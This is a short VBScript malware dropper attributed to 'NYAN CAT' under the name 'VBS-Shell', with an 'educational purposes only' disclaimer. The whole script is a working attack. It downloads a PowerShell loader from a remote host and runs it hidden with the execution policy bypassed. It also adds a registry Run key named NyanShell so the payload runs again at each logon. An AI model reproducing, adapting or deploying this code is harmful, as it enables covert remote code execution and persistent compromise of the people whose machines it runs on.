''       / Author     : NYAN CAT
''       / Name       : VBS-Shell
''       / Contact    : https://github.com/NYAN-x-CAT

''       This program is distributed for educational purposes only.

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://192.168.1.195/lo.txt", False
xHttp.Send
scriptShell = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + "\Loader.ps1"
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile scriptShell, 2
end with
WScript.Sleep 1000
ExecuteAndInstall(scriptShell)

Function ExecuteAndInstall(path)
Set objShell = CreateObject("Wscript.shell")
objShell.run("powershell -executionpolicy bypass -noprofile -windowstyle hidden -noexit -file " + path)
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\NyanShell","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden -noexit -file " + path,"REG_SZ"
End Function